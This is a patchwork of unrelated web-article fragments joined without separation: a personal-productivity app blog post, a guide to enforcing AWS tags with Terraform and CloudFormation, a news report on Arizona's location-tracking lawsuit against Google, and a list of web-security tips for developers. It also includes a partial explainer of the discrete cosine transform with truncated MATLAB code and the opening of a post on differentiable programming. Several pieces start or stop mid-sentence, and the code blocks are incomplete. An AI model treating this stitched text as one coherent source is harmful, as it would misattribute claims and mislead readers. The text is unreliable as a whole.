<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Notion: My Life OS</h2><p>As far as flexibility and personalization, Notion takes the cake. Unlike Evernote, each page in Notion is composed of blocks – blocks that can be uniquely shaped and created to do exactly what you want them to do.<br></p><p>Want a bullet point? Add a block. Need a checkbox? Add a block. Want to make an H1 heading? You guessed it, another block.<br></p><p>Everything in my Notion revolves around my Life Dashboard. The dashboard is a compilation of linked pages for different areas of my life such as my Youtube channel, my weekly Newsletter, and freelance video editing.<br></p><p>Along with my life silos, I have pages created for projects that I’m working on, a master database for all the books I’m either currently reading or have read, and a master goals page.&nbsp;<br></p><p>&nbsp;I use my dashboard as a landing page for my life. Whenever I need to access some notes, figure out what video to make, or blog post to write next, I navigate to my dashboard and begin cranking out work like a productivity grease monkey.<br></p><h2>Obsidian: Live Notes &amp; Ideas</h2><p>Obsidian is the holding tank for all my notes on articles, books, podcasts, and ideas. Obsidian’s structure, or lack thereof, makes it easy to link notes together manually or automatically with the backlink functionality.<br></p><p>&nbsp;A typical article will have anywhere from 5 to 30 backlinks, depending on its length. I backlink most nouns such as companies, names, and key terms. Doing so adds a unique function that most note taking apps can’t give – serendipity. Let me explain.<br></p><p>If I’m taking notes on an article written by David Perell that mentions the key terms Gardner, Librarian, and Architect, I will most likely back link each of those. When I click into each key terms page and show backlinks, I see the reference that David Perell made to it. However, because I took notes on that exact topic on a different article from Ness Labs, those notes will show there as well.<br></p><p>I now have two different sources talking about the same topic in my personal wiki. From here, I can read both articles and synthesize, or try and create my own take on the Gardner, Architect, Librarian philosophy. This doesn’t typically happen in rigid note taking apps such as Evernote or OneNote unless you manually think, “Ah, these two terms are related.”</p><h2>Evernote: Set it and Forget it</h2><p>Evernote, or as I like to call it, ‘Ol Reliable.&nbsp;<br></p><p>Evernote has been around a long time, and, along with Word, Evernote made massive waves in the Personal Knowledge/Information Management field. Founded in 2004, it was one of the first companies to adopt smartphone operating procedures. Within a few years, Evernote was seeing incredible success and <a href="https://www.nytimes.com/2019/06/28/business/evernote-what-happened.html">most thought they were headed</a> toward a great IPO.<br></p><p>Because it has been around so long, people depend on Evernote to store a plethora of information, which it does quite well. However, the hierarchical structure of Evernote makes it hard to manipulate notes like in Obsidian. Additionally, its rigid format doesn’t allow for the same degree of personalization as Notion.<br></p><p>Although I use both Obsidian and Notion already, I do use Evernote as well. Evernote has insanely accurate Optical Character Recognition (OCR for short), which makes it a great tool to store important documents or receipts.&nbsp;<br></p><p>OCR means Evernote can search the actual text on a PDF or JPEG, instead of just searching the text that was written in the program like Notion or Obsidian do. This makes it invaluable to store house documents, receipts you might not want to throw away, or handbooks you want to get out of storage; this is exactly what I use Evernote for.<br></p><p>When you signing up, Evernote creates a custom email for each user. When emails or attachments are sent to this email, they automatically appear in the Inbox section of Evernote. From there, you can drag and drop the file to the appropriate folder. This has been game changing in regards to getting all my important docs saved because I can easily snap a photo on my phone, use the text expander feature on IOS to get my Evernote email address, and it’s on it’s way.&nbsp;<br></p><div><p>Thomas Edison would lose his mind if he had these features when inventing that lightbulb.</p></div><h3><strong>Task Manager/Reminders</strong></h3><p>The best feature in any task manager is quick capture. Think, “quick capture is queen”. That’s why I use Things3.<br></p><h2>Things3: Basically Wizardry</h2><p>Things3 is an <em>incredible </em>task manager. Its quick capture feature, its automatic imports from reminders, its ability to add different projects and areas, and its inbox/today view blow any other task manager out of the water.<br></p><p>I use Things3 as a quick capture tool when I’m at my desk or anywhere else on my laptop. If I come across an article I want to read, a video I want to watch, or a company I want to research, instead of doing that in the moment and ruining the flow of work, I add a new task to my inbox.<br></p><p>By simply pressing CTRL + SPACE, a small window in the center of the screen appears. Things3 automatically captures the URL of the current tab I’m on and places that in the notes. Then, I type in one of my many action verbs such as watch:, read:, or look up:, and describe what it is, then press enter.<br></p><p>I use keyboard shortcuts for my action verbs because it helps speed up the process when I batch process them all in my inbox. Here are a few that I use:&nbsp;<br></p><ul role="list"><li>/wr = write:</li><li>/em = email:</li><li>/rd = read:</li><li>/rv: review</li></ul><h2>IOS Reminders</h2><p>If used properly, the native reminders app can be an incredible quick capture tool when on the go. I use my reminders to remind me of absolutely anything and everything I have an idea for or want to do at my desk sometime later.<br></p><p>Sometimes, they’re actual reminders such as, “Remind me to call Belen and schedule a haircut.” Or, they can be less actionable such as, “10,000 hour rule is true, but what can 100 hours make you.” Seems pretty cryptic, but let me explain.<br></p><p>Whenever I’m listening to a podcast that has an interesting idea that could make a good blog post, I tap the siri button in my car and say, “Add to my reminders the 10,000 hour rule is true, but so is the 100 hour rule blog post idea.”<br></p><p>Instead of having to text and drive or hold onto that thought until I get to my destination, using Siri to add stuff to my reminders like that has been revolutionary. I now know when I get back to my desk, that reminder will be waiting for me in my inbox of my task manager. From there, I can open up Notion and create a new page in my Master Blog Post table for that idea.<br></p><p>If I'm listening to the <em>My First Million</em> podcast and they mention an interesting company I want to research later, I do the same thing. I simply tap the Siri button and say, “Remind me to look up tempo.fit.”<br></p><p>If I’m not in my car, say I’m walking around the grocery store, I’ve optimized my widget section on my iPhone to quickly add new things to my reminders. I made a video on how I did that, so I won’t write about it here. To watch, click <a href="https://youtu.be/_WI6hO7hgZ0">here</a>.<br></p></div></div>]]>

                <!-- Toc if any -->            
                
                <!-- End Toc -->
				

<p>Once <a href="https://www.cloudforecast.io/blog/aws-tagging-best-practices/" target="_blank">you have adopted an AWS tagging strategy</a>, you’ll need to make sure that all your existing AWS resources and any new ones you create abide by it. Consistency is the key - if you don’t proactively enforce your AWS tagging strategy, you’ll always be playing catch up and chasing down team members to make sure they add the right tags to their resources.</p>

<p>While you can apply AWS tags to your resources manually using the <a href="https://docs.aws.amazon.com/cli/latest/reference/resourcegroupstaggingapi/tag-resources.html" target="_blank">AWS CLI</a> or <a href="https://docs.aws.amazon.com/ARG/latest/userguide/tag-editor.html" target="_blank">AWS Tag Editor</a>, you’ll probably find this cumbersome and error-prone at scale. A better approach is to automatically apply AWS tags to your resources and use rules to enforce their consistent usage.</p>

<p>Depending on the tool you use to maintain your infrastructure on AWS, your method of proactively enforcing AWS tags on new resources may vary. In this guide, I’ll highlight two tools: Terraform and AWS CloudFormation. You’ll see how to use each to create and update AWS cost allocation tags on your resources and then enforce the proper use of specific tags for new resources. By proactively enforcing your AWS tagging strategy, you’ll minimize your time spent auditing and correcting improper AWS tags and force developers to learn best AWS tagging best practices for your environment.</p>



<p>The first infrastructure management tool I’ll cover is <a href="https://www.terraform.io/" target="_blank">Terraform</a>. Terraform works across a variety of cloud hosting providers to help you provision and maintain your AWS resources. With Terraform, you can define your servers, databases, and networks in code and apply your changes programmatically to your AWS account.</p>

<p>If you’re new to Terraform, they have a well-documented <a href="https://learn.hashicorp.com/terraform/getting-started/intro" target="_blank">Getting Started guide</a> and several <a href="https://github.com/terraform-providers/terraform-provider-aws/tree/master/examples" target="_blank">AWS template examples on GitHub</a>. In this section, I’ll show you some snippets from a demo Terraform project and module that <a href="https://github.com/CloudForecast/cf-terraform-demo" target="_blank">is available on GitHub</a>. You’ll learn the following in this Terraform AWS tags:</p>

<ol>
  <li>Tag a New AWS EC2 Instance with Terraform</li>
  <li>Using Terraform to Update Existing AWS Tags</li>
  <li>Enforce AWS Tags with Terraform</li>
</ol>

<h3 id="tag-a-new-aws-ec2-instance-with-terraform">Tag a New AWS EC2 Instance with Terraform</h3>

<p>If you want to deploy an EC2 instance with AWS Tags using Terraform, your configuration might include something like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td><pre>resource "aws_instance" "cart" {
  connection {
    type = "ssh"
    user = "ubuntu"
    host = self.public_ip
    private_key = file(var.private_key_path)
  }

  instance_type = "t2.micro"

  ami = var.aws_amis[var.aws_region]

  key_name = aws_key_pair.auth.key_name

  vpc_security_group_ids = [aws_security_group.default.id]

  subnet_id = aws_subnet.default.id

  provisioner "remote-exec" {
    inline = [
      "sudo apt-get -y update",
      "sudo apt-get -y install nginx",
      "sudo service nginx start",
    ]
  }
  tags = {
    contact = "j-mark"
    env = "dev"
    service = "cart"
  }
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>The above example includes three AWS cost allocation tags: <code>contact</code>, <code>env</code>, and <code>service</code> with values described as strings. When you <a href="https://www.terraform.io/docs/commands/apply.html" target="_blank">apply this configuration</a>, Terraform will connect to AWS and deploy an EC2 instance having the AWS tags you specified.</p>

<p><img src="https://paper-attachments.dropbox.com/s_11675783F6270CC3362B9903B770D88B278C2B2D779D11551760688B8EA1DFC4_1596383259429_cf-2020-08-02-a.png" alt=""></p>

<h3 id="using-terraform-to-update-existing-aws-tags">Using Terraform to Update Existing AWS Tags</h3>

<p>Terraform makes it easy to update already existing resources with AWS tags in reversible and consistent ways. If you’re using AWS tags to keep track of a resource’s contact (e.g.: <code>j-mark</code> in the above example), you’re likely to need to update the AWS tag when the team member leaves or changes roles.</p>

<p>To update the AWS tags on your resource, simply update the corresponding tags in your Terraform configuration. The new tags will overwrite any previous tags assigned to the resource, including tags added outside of Terraform.</p>

<p>For example, to change the <code>contact</code> cost allocation tag on the EC2 instance above, you might update the <code>tags</code> block above with the following:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre>tags = {
  contact = "l-duke"
  env = "dev"
  service = "cart"
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>When you apply this configuration, the AWS tags will be automatically updated in the AWS console:</p>

<p><img src="https://paper-attachments.dropbox.com/s_11675783F6270CC3362B9903B770D88B278C2B2D779D11551760688B8EA1DFC4_1596383277121_cf-2020-08-02-b.png" alt=""></p>

<p>If you keep your Terraform configuration files in version control - which is probably a good idea - you will be able to see how tags have changed over time. You can also review changes using the same code review process that your application code goes through to help you catch mistakes in the execution of your tagging strategy.</p>

<h3 id="enforce-aws-tags-with-terraform">Enforce AWS Tags with Terraform</h3>

<p>As your infrastructure grows, a code review process likely won’t be enough to prevent improper AWS tagging. Fortunately, you can enforce AWS tag names and values using <a href="https://www.terraform.io/docs/configuration/variables.html" target="_blank">variables</a> and custom validation rules in Terraform.</p>

<p>In the examples above, the <code>tags</code> list was hard-coded into the EC2 instance definition. A more scalable pattern would be to break your EC2 instance template into its own <a href="https://www.terraform.io/docs/configuration/modules.html" target="_blank">module</a> and use a <code>tags</code> variable. You can then write a <a href="https://www.terraform.io/docs/configuration/variables.html#custom-validation-rules" target="_blank">custom validation rule</a> to check that the tags comply with your strategy.</p>

<p>For example, if you want to check that:</p>

<ol>
  <li>The user specifies at least one tag</li>
  <li>The <code>contact</code> tag is either <code>j-mark</code> or <code>l-duke</code></li>
  <li>The <code>env</code> tag is set</li>
  <li>The <code>service</code> tag is either <code>cart</code> or <code>search</code></li>
</ol>

<p>You might create a module with a variable specified like this:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
8
</pre></td><td><pre>variable "tags" {
  description = "The tags for this resource."
  validation {
    condition = length(var.tags) &gt; 0 &amp;&amp; contains(["j-mark", "l-duke"], var.tags.contact) &amp;&amp; var.tags.env != null &amp;&amp; contains(["cart", "search", "cart:search"], var.tags.service)
    error_message = "Invalid resource tags applied."

  }
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Now when you run <code>terraform plan</code> with a missing or invalid tag, you’ll get an error:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>Error: Invalid value for variable
...
Invalid resource tags applied.
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Your rules can be as complex as <a href="https://www.terraform.io/docs/configuration/index.html" target="_blank">Terraform’s Configuration Language</a> allows, so functions like <code>regex()</code>, <code>substr()</code>, and <code>distinct()</code> are all available. That said, there are some caveats to this approach.</p>

<p>First, custom variable validation is an experimental feature in Terraform. <a href="https://www.terraform.io/docs/configuration/terraform.html#experimental-language-features" target="_blank">Experimental features</a> are subject to change, meaning that you might need to pay attention to Terraform update mores closely. To enable <code>variable_validation</code>, add the following to your <code>terraform</code> block:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
</pre></td><td><pre>terraform {
  experiments = [variable_validation]
}
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Second, Terraform’s variable validation only happens during the <code>terraform plan</code> phase of your infrastructure’s lifecycle. It can’t prevent users from accidentally changing your tags directly in the AWS console, and it’s only as good as the validation rules you write. If you start using a new resource but forget to add validation rules, you might end up with lots of resources that don’t adhere to your tagging strategy.</p>

<p>Another option for paid Terraform Cloud customers is <a href="https://www.terraform.io/docs/cloud/sentinel/index.html" target="_blank">Sentinel</a>, which allows you to create custom policies for your resources. I won’t cover this method here, but Terraform has created an <a href="https://www.terraform.io/docs/cloud/sentinel/examples.html" target="_blank">example policy</a> to show you how to enforce mandatory AWS tags.</p>



<p>Similar to Terraform, AWS <a href="https://aws.amazon.com/cloudformation/" target="_blank">CloudFormation</a> lets you provision AWS resources based on configuration files. Unlike Terraform, CloudFormation is part of Amazon’s offerings, so it won’t necessarily help you if you want to use another infrastructure provider. The approach to tagging your resources in CloudFormation is similar to that used by Terraform, but as you’ll see, the configuration format is different.</p>

<p>If you’re new to AWS CloudFormation, <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/GettingStarted.Walkthrough.html" target="_blank">Amazon’s official walkthrough</a> will help you get started deploying some basic templates. In this section, I’ll show you some snippets from a demo AWS CloudFormation template which is <a href="https://github.com/CloudForecast/cf-cloudformation-demo" target="_blank">also available on GitHub</a>. You’ll learn the following in this Terraform AWS tags section:</p>

<ol>
  <li>AWS CloudFormation Template to Deploy Tags</li>
  <li>Using CloudFormation to Update AWS Tags</li>
  <li>CloudFormation Template to Enforce AWS Tags</li>
</ol>

<h3 id="aws-cloudformation-template-to-deploy-tags">AWS CloudFormation Template to Deploy Tags</h3>

<p>AWS CloudFormation is designed to make it easy to create AWS resources with a single template file. Using a CloudFormation template, every resource that can be deployed with an AWS tag.</p>

<p>For example, to create a new EC2 instance with the same three AWS tags used in the Terraform example above, add an array of <code>Tags</code> to the resource’s <code>Properties</code> block:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7

24
</pre></td><td><pre>"Resources" : {
  "WebServerInstance": {  
    "Type": "AWS::EC2::Instance",
    "Metadata" : {...},
    "Properties": {
      "Tags" : [
       {
          "Key" : "contact",
          "Value" : "j-mark"
       },
       {
          "Key" : "env",
          "Value" : "dev"
       },
       {
          "Key" : "service",
          "Value" : "cart"
       }
      ],
      ...       
    }
  },
  ...         
},
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Using <a href="https://aws.amazon.com/cli/" target="_blank">AWS CLI</a>, you can <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cloudformation/create-stack.html" target="_blank">deploy this CloudFormation template as a new stack</a>. This will ensure your template is valid and create the specified resources with their tags on AWS:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
</pre></td><td><pre>aws cloudformation create-stack --template-body file://path/to/your/template.json --stack-name=&lt;YOUR_STACK_NAME&gt;
</pre></td></tr></tbody></table></code></pre></div></div>

<p>If you have lots of similar resources in your template, you can deploy AWS tags to all the resources in the stack at once using the <code>--tags</code>  flag with the <code>create-stack</code> or <code>update-stack</code> commands:</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
</pre></td><td><pre># Creating a stack with tags
aws cloudformation create-stack --template-body file://path/to/your/template.json --stack-name=&lt;YOUR_STACK_NAME&gt; --tags="Key=env,Value=dev"

# Updating a stack with tags
aws cloudformation update-stack --template-body file://path/to/your/template.json --stack-name=&lt;YOUR_STACK_NAME&gt; --tags="Key=env,Value=dev"
</pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="using-cloudformation-to-update-aws-tags">Using CloudFormation to Update AWS Tags</h3>

<p>If you want to change the contact on your EC2 instance created above, simply change the <code>Tags</code> section of your template file and use the <code>[update-stack](https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cloudformation/update-stack.html)</code> <a href="https://awscli.amazonaws.com/v2/documentation/api/latest/reference/cloudformation/update-stack.html" target="_blank">command</a> to deploy your changes.</p>

<div><div><pre><code><table><tbody><tr><td><pre>1
2
3
4
5
6
7
</pre></td><td><pre>"Tags" : [
 {
    "Key" : "contact",
    "Value" : "l-duke"
 },
  ...
],
</pre></td></tr></tbody></table></code></pre></div></div>

<p>AWS CloudFormation behaves the same way that Terraform does when you update tags outside your template file. Any tags set manually will be overridden by the <code>update-stack</code> …</p></div></div>

 <li>Google is embroiled in several <keyword keytype="person" smid="0" usetype="2" keywordseo="lawsuits" actualkeyword="lawsuits">lawsuits</keyword> over the way it uses data, and it has been hit with several multibillion-dollar fines in recent years.</li>
</ul>
<p data-pos="4">New information has surfaced in a lawsuit involving Google's data collection and location-tracking practices, including statements by the company's own engineers that its privacy settings were confusing to both users and employees.</p>
<p data-pos="6"><keyword keytype="Entertainment" smid="0" usetype="2" keywordseo="Arizona" actualkeyword="Arizona">Arizona</keyword> Attorney General Mark Brnovich's office sued Google in May, accusing the company of deceiving users about when and how it tracked their locations and continuing to track them even after they tried to opt out.</p><p>

One employee said the user interface "feels like it is designed to make things possible, yet difficult enough that people won't figure it out," according to the new complaint, which was earlier reported by the <a target="_blank" href="https://www.azmirror.com/2020/08/24/unsealed-google-lawsuit-docs-show-its-own-engineers-were-confused-by-privacy-settings/" rel="nofollow">Arizona Mirror</a>.
</p><p data-pos="12">"Definitely confusing from a user point of view if we need googlers [to] explain it to us," another said.</p><p>
"Privacy controls have long been built into our services and our teams work continuously to discuss and improve them," a Google spokesman told the Arizona Mirror. "In the case of location information, we've heard feedback, and have worked hard to improve our privacy controls. In fact, even these cherry picked published extracts state clearly that the team's goal was to 'Reduce confusion around Location History Settings.'"</p><p><span>Advertisement</span></p><hr>
<p data-pos="16">The lawsuit stemmed in part from a 2018 report by the <a target="_blank" href="https://apnews.com/828aefab64d4411bac257a07c1af0ecb/AP-Exclusive:-Google-tracks-your-movements,-like-it-or-not" rel="nofollow">Associated Press</a> that found Google continued to track users even after they explicitly changed a privacy setting telling it not to by collecting location information from other Google products.</p><p>
While Google defended itself in a statement to the AP at the time, newly unredacted evidence in the lawsuit indicates that even some employees felt the company's settings were deceptive.
"I agree with the article. Location off should mean location off, not except for this case or that case," one employee said.<span data-pos="20">Advertisement</span></p><hr>
<p data-pos="22">"Speaking as a user, WTF? More specifically I **thought** I had location tracking turned off on my phone," one engineer said, according to the Arizona Mirror, adding: "So our messaging around this is enough to confuse a privacy focused (Google software engineer). That's not good."</p>
<p data-pos="24">The attorney general's office alleged in the complaint that "even top-level Google employees do not understand under what conditions Google collects location data."</p>
<p><a target="_blank" href="https://assets.documentcloud.org/documents/20385392/arizona-v-google-exhibits-20-23.pdf" rel="nofollow">New exhibits</a> released along with the less redacted complaint also showed how Google scrambled to respond to the AP article, holding what was described internally as an "oh s---" meeting to discuss its public response and changes to its privacy settings.<span data-pos="26">Advertisement</span></p><hr>
<p data-pos="28">"Both comms and policy are looking for an update on where we are in terms of fixing 'location history' fixes and having one single place to turn off instead of 3," one employee wrote in a recap of the meeting, according to the exhibit.</p>
<p data-pos="30">Google also tracked the story's reach in daily reports, according to <a target="_blank" href="https://cdn.arstechnica.net/wp-content/uploads/2020/08/arizona-v-google-exhibit-219-225.pdf" rel="nofollow">another exhibit</a>, identifying more than 60,000 mentions on social media and characterizing 100% of related media coverage as "negative."</p><p>
This is not the first time Google has faced legal scrutiny over the way it collects and uses data.<span data-pos="32">Advertisement</span></p><hr><p>
Last December, months after slapping the company with its third multibillion-dollar fine in just three years, the European Union opened an <a target="_blank" href="https://www.businessinsider.com/google-faces-eu-investigation-over-collection-of-data-2019-12" rel="nofollow">antitrust investigation</a> into the way Google leveraged data.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    















<p><strong>Disclaimer:</strong> I am not a security expert.</p>
<p>This post is a collection of quick tiny little things that could improve your security drastically. We would have a much safer web if more developers would know some of these resources and tips.</p>
<h2 id="use-a-checklist">Use a checklist</h2>
<p>This might sound a bit weird, but checklists are a great and powerful tool.</p>
<p>Ever heard of the <a href="https://www.who.int/patientsafety/safesurgery/checklist/en/">Surgical Safety Checklist from the WHO</a>? In their study, this checklist reduced the morbidity rate of patients by almost 50% <sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup>.
This effectiveness will also apply to WebSecurity.</p>
<p>You will forget or don’t even know about some vulnerabilities. I recommend the <a href="https://cheatsheetseries.owasp.org/Glossary.html">OWASP Cheatsheet Project</a>. The usefulness of this project is incredible. For one of my own <a href="https://likeknob.com/">Web-Apps</a>, I forgot to install a CSRF Protection but saw them on the Cheatsheet.</p>
<p>I personally forgot to implement a CSRF protection for certain actions in <a href="https://likeknob.com/">my Web-App</a>.</p>
<h2 id="your-users-are-evil">Your users are evil</h2>
<p>Or you should at least pretend so. Never trust any input that comes from your users. Imagine them as hackers.</p>
<p>This will put you in the right mindset.</p>
<p>Some of the <a href="https://owasp.org/www-project-top-ten/">most common vulnerabilities</a> come from improper input handling.</p>
<p>Can you put restrictions on the input of your web app? Then do it. The stricter the better.</p>
<p>This also accounts for strange things like: Does your App accept a 1GB big JSON file?</p>
<p>Considering strange inputs, here is a <a href="https://github.com/minimaxir/big-list-of-naughty-strings/">list of strings</a> which may break some applications. And you may test if that also breaks your app.</p>
<p>Additionally, ask yourself: “How would I hack my own app?”</p>
<h2 id="log--monitor-things">Log &amp; Monitor things</h2>
<p>This is also a great point from a non-security perspective. You should always know when something is wrong.</p>
<p>Only if you know something is wrong, you can fix it. I will again recommend a <a href="https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html">OWASP Cheatsheet about Logging</a>.</p>
<p>If you noticed a security incident, be open to your users. Don’t try to hide something.</p>
<p>Being open about such incidents is important and builds trust. In most cases you are also legally required (<a href="https://gdpr-info.eu/art-34-gdpr/">GDPR Art. 34</a>) to inform your users.</p>

<p>So, you tried your best to secure your app. Most likely there will be still vulnerabilities in there.</p>
<p>For this reason: Make it easy for security researchers to reach out to you.</p>
<p>Signal them you will not go after them if they didn’t break any laws. There is a high chance many security researchers will not search or report vulnerabilities because they are afraid of legal retaliation.</p>
<p>So, how do you do that?</p>
<ul>
<li>
<p>Provide a Responsible Disclosure Policy.</p>
<p>In short, it states what security researchers are allowed to test and where to report them.</p>
<p>Bugcrowd (one of the biggest bug bounty platforms) provides a framework for <a href="https://github.com/bugcrowd/disclosure-policy">creating such a policy</a> and a <a href="https://www.bugcrowd.com/resource/what-is-responsible-disclosure/">more in-depth article about Responsible Disclosure Policies</a></p>
</li>
<li>
<p>Provide a security.txt file.</p>
<p>This is a <a href="https://securitytxt.org/">standard proposed by a security researcher</a>.</p>
<p>It’s basically a text file that states where you can disclose security vulnerabilities and how. You can create it easily via <a href="https://securitytxt.org/">the official website</a>.</p>
</li>
<li>
<p>Provide a <code>security@example.com</code> mail address.</p>
<p>Many researchers try this first.</p>
<p>If it fails, there is a lower chance a vulnerability will be reported to you.</p>
</li>
</ul>
<p>If you don’t have any of these, it’s like a sign “No Good Hackers allowed here.”</p>
<p>If you want to read more about why we need more hackers, there is an excellent article <a href="https://medium.com/@yakko.majuri/the-internet-is-too-unsafe-we-need-more-hackers-c9742fc1a03b">here</a>.</p>
<h2 id="last-words">Last words</h2>
<p>Security is hard. It takes time and work to do things more securely.</p>
<p>For the sake of a better web, try it.</p>
<p>We need more hackers that hack for good and more people that are aware of those pitfalls.</p>
<p>Further recommendation:</p>
<p>There are also techniques to write more secure code. I’ve heard good things about the book “Secure by Design” from Deogun, Johnsson, and Sawano.</p>
<p>Take a look at a <a href="https://henrikwarne.com/2020/03/22/secure-by-design/">good summary</a>.</p>
<p><strong>Got a website? I would be happy if you take a look at my <a href="https://likeknob.com/">new Project</a>.</strong></p>

For those who don’t know, its a game where a person chooses an item in a room in his mind and the others have to guess it by asking questions (like 20 questions).</p><p>Now, let’s assume that I think of a painting of a boat hanging on the wall and ask a 5 year old to ask questions and guess what I am thinking of.</p><p>For the sake of this example, lets tweak the rules and provide the 20 clues ourselves.</p><p>The best clue that we can provide is something like this “the item is hanging on the wall opposite the door”. This is guaranteed to lead the kid close to the prize, right?</p><p>The next best clue would be something like “the item is a square or box-shaped”. After that, we could say something like “it has an ocean and a boat in it.”.</p><p>If you do this carefully, you don’t need 20 clues to guide the kid to the painting – in all likelihood, 5 - 8 clues would suffice. And, by now, you would have realized that some of the clues can lead the kid to the answer faster than the other clues - this is an indication to the amount of information those clues hold within them.</p><p>Time to pause and consider what we have done so far.</p><p>So, what you’ve done is,</p><ul><li>taken some data as input (the location of a painting),</li><li>converted it into a set of 20 clues (output),</li><li>arranged the clues in order of importance (how much information does the clue contain),</li><li>and shown that just a few of the clues can capture the location of the painting while the rest of them add details to the puzzle.</li></ul><p>This is in essence what the DCT does.</p><p>It takes data in one form, converts it to another form such that the output data is arranged in order of importance. This allows us to throw away most of the output data and still be able to get back to the original data.</p><p>I hope you understood what the DCT is trying to achieve (in essence).</p><p><strong>Because, the kid gloves have to come off now and the ELI5 ends here :) The remaining sections require high school math and some understanding of programming - preferably in MATLAB or Octave.</strong></p><h2 id="introducing-the-discrete-cosine-transform">Introducing the Discrete Cosine Transform</h2><p>The Discrete Cosine Transform or DCT is a widely used transform for image and video compression. It’s definition as per Wikipedia is as follows :-</p><blockquote><p>The Discrete Cosine Transform expresses a finite sequence of data points in terms of a sum of cosine functions oscillating at different frequencies.</p></blockquote><p>Still with me? Don’t worry about the math behind the DCT for now.</p><p>In simpler terms, the Discrete Cosine Transform takes a set of <code>N</code> correlated (similar) data-points and returns <code>N</code> de-correlated (dis-similar) data-points (coefficients) in such a way that the energy is compacted in only a few of the coefficients <code>M</code> where <code>M &lt;&lt; N</code>.</p><p>If that doesn’t make sense, try and remember this - the DCT takes input data and converts it to another domain while doing two very important things -</p><ol><li><strong>it de-correlates the data (removes any relation or similarity between the data points)</strong></li><li><strong>it compacts the energy/information into only a few of the output data points</strong></li></ol><p>To summarize, the DCT takes</p><ul><li>N data-points as its input</li><li>returns N data-points as its output</li><li>and ensures, that most of the information of the input is concentrated in only a few of the N output data-points.</li></ul><p>This is called the energy-compaction (or information compaction) property of the DCT.</p><p>Let’s understand this with an example using MATLAB.</p><p>Take an <code>8x8</code> matrix filled with the number <code>255</code> as shown below. If you need <code>8</code> bits to store each number, then you need <code>8 x 64 = 512</code> bits for storing the entire matrix. Good so far?</p><figure><img src="https://ottverse.com/images/input_255.png"></figure><p>Okay, now, let’s apply an <code>8x8</code> 2D-DCT to this matrix and get <code>8x8</code> DCT coefficients. They are shown below.</p><figure><img src="https://ottverse.com/images/coeffs_255.png"></figure><p>Looks different, doesn’t it?</p><p>If you notice carefully, the first coefficient (<code>[0, 0]</code>) element of the matrix is non-zero and the rest of the elements are zero. This greatly reduces the storage space needed for this matrix.</p><p>This is due to the de-correlating and energy compaction property of the DCT. This is usually described as follows in technical literature and can be a little difficult to understand -</p><blockquote><p><strong><em>the DCT has compacted the energy of the matrix into the first element referred to as the <code>DC</code> coefficient. The rest of the coefficients are called the <code>AC</code> coefficients.</em></strong></p></blockquote><p>What this is referring to is -</p><ul><li>the top-left corner of the output 2D DCT is called the DC coefficient. It is the most important output of the DCT and contains a lot of information about the original image.</li><li>the rest of the coefficients are called the AC coefficients. If you are transforming an image using the DCT, the AC coefficients contain finer details of the image.</li></ul><p>Now, if I take these DCT coefficients and apply an inverse-2D-DCT to it, I will get back the original coefficients.</p><p>If you want to try it out, here are the MATLAB commands to replicate the above experiment.</p><div><pre><code data-lang="matlab">inputPixels = <span>ones</span>(<span>8</span>,<span>8</span>) * <span>255</span>;

</code></pre></div><h2 id="application-of-dct-to-image--video-compression">Application of DCT to Image &amp; Video Compression</h2><p>The de-correlation and energy compaction properties of the DCT make it extremely attractive to image and video compression. The Karhunen–Loève transform (KLT) often referred to as the <em>ideal transform</em> has much better decorrelating properties but is computationally intractable. The DCT on the other hand, is easy to program and has captured the image and video compression world.</p><p>Here is a simple MATLAB <a href="https://in.mathworks.com/help/images/ref/dct2.html">script</a> that demonstrates the power of the 2D-DCT when applied to image compression (and, in extension to video compression).</p><div><pre><code data-lang="matlab"><span>% read an image (MATLAB provides a few sample images)</span>

<p>We’ve discussed the idea of <a href="https://fluxml.ai/2019/02/07/what-is-differentiable-programming.html">differentiable programming</a>, where we incorporate existing programs into deep learning models. This article shows what ∂P can bring to some simple but classic control problems, where we would normally use black-box Reinforcement Learning (RL). ∂P-based models not only learn far more effective control strategies, but also train orders of magnitude faster. The <a href="https://github.com/FluxML/model-zoo/tree/cdda5cad3e87b216fa67069a5ca84a3016f2a604/games/differentiable-programming">code</a> is all available to run for yourself – they will mostly train in a few seconds on any laptop.</p>

<h2 id="follow-the-gradient">Follow the Gradient</h2>

<p>Differentiation is what makes deep learning tick; given a function [[y = f(x)]] we use the gradient [[\frac{dy}{dx}]] to figure out how a change in [[x]] will affect [[y]]. Despite the mathematical clothing, gradients are actually a very general and intuitive concept. Forget the formulas you had to stare at in school; let’s do something more fun, like throwing stuff.</p>

<p><img src="https://fluxml.ai/assets/2019-03-05-dp-vs-rl/trebuchet-basic.gif"></p>

<p>When we throw things with a trebuchet, our [[x]] represents a setting (say, the size of the counterweight, or the angle of release), and [[y]] is the distance the projectile travels before landing. If you’re trying to aim, the gradient tells you something very useful – whether a change in aim will increase or decrease the distance. To maximise distance, just follow the gradient.</p>

